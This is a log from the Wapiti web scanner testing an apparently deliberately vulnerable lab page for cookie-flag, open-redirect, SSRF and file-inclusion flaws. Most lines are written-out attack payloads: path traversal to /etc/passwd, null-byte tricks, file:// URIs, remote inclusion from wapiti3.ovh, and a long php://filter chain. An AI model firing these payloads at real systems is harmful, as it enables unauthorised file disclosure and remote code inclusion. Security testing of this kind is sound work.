2024-03-20 12:44:13.580 | BLUE     | wapitiCore.attack.mod_cookieflags:attack:55 - Checking cookie : PHPSESSID
2024-03-20 12:44:13.580 | RED      | wapitiCore.attack.mod_cookieflags:attack:57 - HttpOnly flag is not set in the cookie : PHPSESSID
2024-03-20 12:44:13.620 | RED      | wapitiCore.attack.mod_cookieflags:attack:66 - Secure flag is not set in the cookie : PHPSESSID
2024-03-20 12:44:13.703 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module redirect
2024-03-20 12:44:13.719 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=Submit (0)
2024-03-20 12:44:13.720 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/vulnerabilities/sqli_blind/?id=https%3A%2F%2Fopenbugbounty.org%2F&Submit=Submit
2024-03-20 12:44:13.742 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/vulnerabilities/sqli_blind/?id=%2F%2Fopenbugbounty.org%2F&Submit=Submit
2024-03-20 12:44:13.766 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=https%3A%2F%2Fopenbugbounty.org%2F
2024-03-20 12:44:13.787 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=%2F%2Fopenbugbounty.org%2F
2024-03-20 12:44:13.819 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=Submit (1)
2024-03-20 12:44:13.819 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/vulnerabilities/sqli_blind/?id=default&Submit=https%3A%2F%2Fopenbugbounty.org%2F
2024-03-20 12:44:13.842 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/vulnerabilities/sqli_blind/?id=default&Submit=%2F%2Fopenbugbounty.org%2F
2024-03-20 12:44:13.871 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/sqli_blind/ (1)
2024-03-20 12:44:13.894 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module upload
2024-03-20 12:44:13.934 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module ssrf
2024-03-20 12:44:13.948 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=Submit (0)
2024-03-20 12:44:13.949 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fjxrrgq%2F1%2F6964%2F&Submit=Submit (0)
2024-03-20 12:44:13.960 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fjxrrgq%2F1%2F5375626d6974%2F (0)
2024-03-20 12:44:13.981 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=Submit (1)
2024-03-20 12:44:13.982 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=default&Submit=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Fjxrrgq%2F2%2F5375626d6974%2F (1)
2024-03-20 12:44:13.997 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/sqli_blind/ (1)
2024-03-20 12:44:14.013 | INFO     | wapitiCore.attack.mod_ssrf:finish:185 - [*] Asking endpoint URL https://wapiti3.ovh/get_ssrf.php?session_id=jxrrgq for results, please wait...
2024-03-20 12:44:16.101 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module file
2024-03-20 12:44:16.121 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=Submit (0)
2024-03-20 12:44:16.129 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&Submit=Submit (0)
2024-03-20 12:44:16.146 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00&Submit=Submit (0)
2024-03-20 12:44:16.164 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=%2Fetc%2Fpasswd&Submit=Submit (0)
2024-03-20 12:44:16.181 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=%2Fetc%2Fpasswd%00&Submit=Submit (0)
2024-03-20 12:44:16.197 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=%2Fetc%2Fservices&Submit=Submit (0)
2024-03-20 12:44:16.212 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=%2Fetc%2Fservices%00&Submit=Submit (0)
2024-03-20 12:44:16.230 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&Submit=Submit (0)
2024-03-20 12:44:16.248 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00&Submit=Submit (0)
2024-03-20 12:44:16.265 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA&Submit=Submit (0)
2024-03-20 12:44:16.278 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&Submit=Submit (0)
2024-03-20 12:44:16.290 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&Submit=Submit (0)
2024-03-20 12:44:16.300 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA&Submit=Submit (0)
2024-03-20 12:44:16.310 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F&Submit=Submit (0)
2024-03-20 12:44:16.321 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F&Submit=Submit (0)
2024-03-20 12:44:16.337 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&Submit=Submit (0)
2024-03-20 12:44:16.348 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&Submit=Submit (0)
2024-03-20 12:44:16.360 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&Submit=Submit (0)
2024-03-20 12:44:16.371 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&Submit=Submit (0)
2024-03-20 12:44:16.383 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&Submit=Submit (0)
2024-03-20 12:44:16.395 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&Submit=Submit (0)
2024-03-20 12:44:16.405 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&Submit=Submit (0)
2024-03-20 12:44:16.417 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&Submit=Submit (0)
2024-03-20 12:44:16.428 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&Submit=Submit (0)
2024-03-20 12:44:16.437 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&Submit=Submit (0)
2024-03-20 12:44:16.447 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&Submit=Submit (0)
2024-03-20 12:44:16.456 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&Submit=Submit (0)
2024-03-20 12:44:16.467 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp&Submit=Submit (0)
2024-03-20 12:44:16.478 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&Submit=Submit (0)
2024-03-20 12:44:16.487 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&Submit=Submit (0)
2024-03-20 12:44:16.498 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&Submit=Submit (0)
2024-03-20 12:44:16.509 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&Submit=Submit (0)
2024-03-20 12:44:16.520 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&Submit=Submit (0)
2024-03-20 12:44:16.531 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&Submit=Submit (0)
2024-03-20 12:44:16.544 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&Submit=Submit (0)
2024-03-20 12:44:16.561 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&Submit=Submit (0)
2024-03-20 12:44:16.573 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&Submit=Submit (0)
2024-03-20 12:44:16.583 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&Submit=Submit (0)
2024-03-20 12:44:16.594 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&Submit=Submit (0)
2024-03-20 12:44:16.603 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&Submit=Submit (0)
2024-03-20 12:44:16.616 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&Submit=Submit (0)
2024-03-20 12:44:16.630 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&Submit=Submit (0)
2024-03-20 12:44:16.644 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&Submit=Submit (0)
2024-03-20 12:44:16.656 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&Submit=Submit (0)
2024-03-20 12:44:16.668 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&Submit=Submit (0)
2024-03-20 12:44:16.678 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&Submit=Submit (0)
2024-03-20 12:44:16.687 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&Submit=Submit (0)
2024-03-20 12:44:16.697 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&Submit=Submit (0)
2024-03-20 12:44:16.705 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&Submit=Submit (0)
2024-03-20 12:44:16.714 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&Submit=Submit (0)
2024-03-20 12:44:16.722 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&Submit=Submit (0)
2024-03-20 12:44:16.732 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&Submit=Submit (0)
2024-03-20 12:44:16.740 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=file%3A%2F%2F%2Fetc%2Fpasswd&Submit=Submit (0)
2024-03-20 12:44:16.751 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&Submit=Submit (0)
2024-03-20 12:44:16.760 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd&Submit=Submit (0)
2024-03-20 12:44:16.770 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00&Submit=Submit (0)
2024-03-20 12:44:16.780 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices&Submit=Submit (0)
2024-03-20 12:44:16.788 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00&Submit=Submit (0)
2024-03-20 12:44:16.799 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&Submit=Submit (0)
2024-03-20 12:44:16.809 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&Submit=Submit (0)
2024-03-20 12:44:16.822 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php (0)
2024-03-20 12:44:16.834 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00 (0)
2024-03-20 12:44:16.844 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=%2Fetc%2Fpasswd (0)
2024-03-20 12:44:16.852 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/sqli_blind/?id=fuzz&Submit=%2Fetc%2Fpasswd%00 (0)
